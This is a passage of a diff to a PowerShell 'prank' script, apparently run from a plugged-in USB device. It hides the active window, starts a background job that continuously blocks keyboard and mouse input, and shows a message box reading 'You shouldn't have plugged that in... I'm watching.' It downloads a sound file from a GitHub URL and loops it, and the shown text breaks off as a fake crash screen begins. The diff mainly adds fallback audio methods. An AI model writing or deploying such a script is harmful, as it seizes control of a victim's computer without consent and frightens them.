@@ -2,8 +2,8 @@ Add-Type @"
 using System;
 using System.Runtime.InteropServices;
 public class Win32 {
-  [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
-  [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
+    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 }
 "@
 
@@ -11,7 +11,7 @@ public class Win32 {
 $hWnd = [Win32]::GetForegroundWindow()
 [Win32]::ShowWindow($hWnd, 0)
 
-# 🔒 Continuously block keyboard and mouse input (enhanced)
+# 🔒 Continuously block keyboard and mouse input
 Start-Job {
     Add-Type @"
     using System;
@@ -30,31 +30,57 @@ Start-Job {
 Add-Type -AssemblyName PresentationFramework
 [System.Windows.MessageBox]::Show("You shouldn't have plugged that in... I'm watching.","System Alert")
 
-# 🔊 Play audio with more reliable method
+# 🔊 RELIABLE AUDIO PLAYBACK
 try {
+    $soundUrl = "https://raw.githubusercontent.com/andythecookie13bruce/wizard-prank/main/sound.mp3"
     $tempFile = "$env:TEMP\prank_sound.mp3"
-    (New-Object Net.WebClient).DownloadFile("https://raw.githubusercontent.com/andythecookie13bruce/wizard-prank/main/sound.mp3", $tempFile)
     
-    Add-Type -TypeDefinition @"
-    using System.Runtime.InteropServices;
-    public class AudioPlayer {
-        [DllImport("winmm.dll")]
-        public static extern int mciSendString(string command, StringBuilder buffer, int bufferSize, IntPtr hwndCallback);
-        
-        public static void Play(string file) {
-            string playCommand = $"open \"{file}\" type mpegvideo alias MediaFile";
-            mciSendString(playCommand, null, 0, IntPtr.Zero);
-            mciSendString("play MediaFile repeat", null, 0, IntPtr.Zero);
+    # Download the sound file
+    Invoke-WebRequest -Uri $soundUrl -OutFile $tempFile -ErrorAction Stop
+
+    # METHOD 1: Native mciSendString (most reliable for MP3)
+    try {
+        Add-Type -TypeDefinition @"
+        using System.Runtime.InteropServices;
+        public class AudioPlayer {
+            [DllImport("winmm.dll")]
+            public static extern int mciSendString(string command, System.Text.StringBuilder buffer, int bufferSize, System.IntPtr hwndCallback);
+            
+            public static void Play(string file) {
+                mciSendString($"open \"{file}\" type mpegvideo alias MediaFile", null, 0, System.IntPtr.Zero);
+                mciSendString("play MediaFile repeat", null, 0, System.IntPtr.Zero);
+            }
+        }
+"@
+        [AudioPlayer]::Play($tempFile)
+    } catch {
+        # METHOD 2: PowerShell SoundPlayer fallback (converts to WAV)
+        try {
+            $wavFile = "$env:TEMP\prank_sound.wav"
+            ffmpeg -i $tempFile -acodec pcm_u8 -ar 22050 $wavFile -y
+            Add-Type -AssemblyName System.Windows.Forms
+            $player = New-Object System.Media.SoundPlayer
+            $player.SoundLocation = $wavFile
+            $player.PlayLooping()
+        } catch {
+            # METHOD 3: PowerShell Beep Final Fallback
+            1..3 | ForEach-Object {
+                [console]::beep(500,300)
+                [console]::beep(300,500)
+                Start-Sleep -Milliseconds 200
+            }
         }
     }
-"@
-    [AudioPlayer]::Play($tempFile)
 } catch {
-    # Fallback to beep if audio fails
-    [console]::beep(500,300)
-    [console]::beep(300,500)
+    # Ultimate fallback if everything fails
+    1..5 | ForEach-Object {
+        [console]::beep(800,200)
+        [console]::beep(400,400)
+        Start-Sleep -Milliseconds 100
+    }
 }
 
+# [Rest of the original script remains unchanged...]
 # 💀 Glitchy crash screen with creepy style
 $html = @"
 <html>
